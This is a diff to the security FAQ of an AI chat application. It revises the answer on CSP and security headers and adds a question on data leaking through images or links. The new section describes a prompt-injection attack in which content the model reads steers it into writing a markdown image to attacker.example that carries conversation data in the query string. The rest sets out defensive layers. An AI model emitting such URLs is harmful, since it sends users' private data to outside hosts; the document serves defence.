@@ -152,12 +152,12 @@ Yes, in the web fetch (`server/web.ts`): it blocks `localhost`, private IPs (IPv
 
 ### 15. Does the application set security headers (CSP, HSTS)?
 
-**Partial (G6).** On every response the app sets `X-Content-Type-Options: nosniff`, `Referrer-Policy: same-origin`, `X-Frame-Options: SAMEORIGIN` and `Permissions-Policy: microphone=(self), camera=()` (the microphone only for the app's own dictation), removes `X-Powered-By`, and sends two CSPs:
+**Yes for the headers (G6); HSTS and TLS stay with the Apps proxy.** On every response the app sets `X-Content-Type-Options: nosniff`, `Referrer-Policy: same-origin`, `X-Frame-Options: SAMEORIGIN` and `Permissions-Policy: microphone=(self), camera=()` (the microphone only for the app's own dictation), removes `X-Powered-By`, and sends two CSPs:
 
-- **Enforced**, conservative: `frame-ancestors 'self'; base-uri 'self'; object-src 'none'; form-action 'self'` (`server/securityHeaders.ts`).
-- **Report-only**, the target policy: `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; connect-src 'self'; frame-src 'self' blob:; frame-ancestors 'none'` (`server/middleware/security.ts`). The browser blocks nothing under it; it only reports to `POST /api/csp-report`, which logs one JSON line per violation with the directive, the blocked origin, the document path and the disposition, and no query string, sample or identity.
+- **Enforced** (`server/securityHeaders.ts`): `frame-ancestors 'self'; base-uri 'self'; object-src 'none'; form-action 'self'; default-src 'self'; script-src 'self' 'unsafe-inline'` plus the egress directives `img-src`, `font-src`, `style-src`, `media-src`, `connect-src` and `frame-src` (the app itself, `data:`, `blob:`, and the origins an admin allowed for images, fonts and styles). Since 2.0.0. `CSP_EGRESS=report` removes the egress and script directives (see [question 21](#21-can-the-model-leak-data-through-an-image-or-a-link-in-an-answer)).
+- **Report-only**, the stricter target policy: `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; connect-src 'self'; frame-src 'self' blob:; frame-ancestors 'none'` (`server/middleware/security.ts`). The browser blocks nothing under it; it only reports to `/api/csp-report`, which logs `csp_violation` with the directive and the blocked origin, never a path or a query.
 
-The target policy is not enforced yet because the `srcdoc` iframes of the decks and design-system previews inherit the page's policy and need inline scripts and design-system assets from other hosts (the reason is in [SECURITY.md](../SECURITY.md#http-protections)). The collected reports are the evidence needed before enforcing it. `Referrer-Policy` stays at `same-origin`, which is stricter than `strict-origin-when-cross-origin`: external sites receive no referrer at all. HSTS comes from the Apps proxy. What the proxy adds to the response has not been verified (threat model §7.1).
+`script-src` keeps `'unsafe-inline'` because the `srcdoc` iframes of the decks and design-system previews inherit the page's policy and use inline scripts. A remote script is blocked; inline script in a sandboxed frame is not, so WebRTC from those frames stays open until they get their own origin (details in [SECURITY.md](../SECURITY.md#http-protections)).
 
 ---
 
@@ -205,3 +205,22 @@ Through GitHub's private channel (the **Security** tab), as described in [SECURI
 - **How to purge:** the user deletes an entry or all of them (`DELETE /api/memory/:id`, `DELETE /api/memory`). "Forget everything" also stamps a per-user marker (`user_memory_state.forgot_at`), so an extraction still running on any app instance writes nothing afterwards; deleting a chat does not delete what was learned from it. An admin turns the feature off with the tool policy key `memory` (Settings → Tools): no learning, no injection, no listing; stored rows stay until their owner deletes them, and deleting still works. Rolling back migration 0006 drops the table and every entry.
 
 *Platform:* the same Lakebase encryption, residency and backups as the rest of the data.
+
+---
+
+### 21. Can the model leak data through an image or a link in an answer?
+
+**Versions before 2.0.0: yes. Upgrade to 2.0.0.** The attack: text the model writes (steered by a document, a web page or a tool result it read) contains `![x](https://attacker.example/p.png?d=<part of the conversation>)`. The browser loads the image on its own, with no click, and the attacker's server receives the query string. The same applies to a remote image, font or stylesheet in a document or a slide, and to a tool call whose arguments carry the data.
+
+What 2.0.0 does, in layers (each one holds if another fails):
+
+- **Browser (CSP, enforced by default).** Images, fonts, styles, media, fetches and frames load only from the app itself, `data:` and `blob:`; remote scripts are blocked. It covers streaming text, stored history, documents, deck slides, the export frame and the print window with one header. An admin can allow an origin for images, fonts and styles from Settings > Administrators > *External asset origins* (no redeploy), or `EXTERNAL_ASSET_ORIGINS` in `app.yaml`.
+- **Placeholder.** An external image in a chat answer or a document is shown as a non-interactive placeholder with the host name. There is no "load anyway" button: the click would send the data.
+- **Deck sanitizer, on save and on read.** Slide HTML loses event handlers, `javascript:` URLs, `<base>`, `<meta http-equiv>`, `<link>`, frames, forms, and remote `src`, `srcset`, `url()` and `@import`. Reading a deck cleans old slides and chat snapshots too, so nothing has to be re-saved.
+- **`web_fetch` rule.** It opens only a URL that the user typed or that a `web_search`/`web_fetch` result listed. A URL that only the model wrote, or that came from a Genie, MCP or file result, is refused.
+- **System-prompt rule.** The model is told not to put conversation, tool or file data into a URL. It is a hint, not a boundary.
+- **Artifact downloads.** Stored images and exports are served with a sandboxing CSP and `nosniff`. Downloads, exports and non-raster stored images (such as SVG) also get `Content-Disposition: attachment`; a raster image (PNG, JPEG...) that the app loads as `<img>` stays inline. Opening any of them as a page runs nothing.
+- **Logs.** `egress_blocked` (server) and `csp_violation` (browser) record the attempt. URL-bearing values never keep a path or a query: `egress_blocked.hosts` holds hostnames, and `csp_violation.blocked` holds an origin (scheme, host and a non-default port) or a CSP keyword (`inline`, `eval`, `data`, `blob`); the value is clipped to 120 characters, so a very long origin can be cut, without a marker. `egress_blocked` records `surface`, `kind`, `hosts`, `count`, `route`, and `truncated` only when true; `csp_violation` records `directive`, `blocked`, `disposition`, and `document` only for an `about:srcdoc` or `about:blank` frame; the logger adds `request_id`, `user_hash` and `route` ([operations.md §6.17](operations.md#617-egress-csp-200-allow-an-origin-emergency-switch-reading-the-logs)).
+
+*Platform:* the serverless network policy decides whether the Python tool can reach the internet; keep it restrictive.
+*App:* everything above. *Not covered:* an external MCP tool that can write or publish, if an admin enabled it (review them), and WebRTC from inline script in sandboxed frames (planned for 2.x).
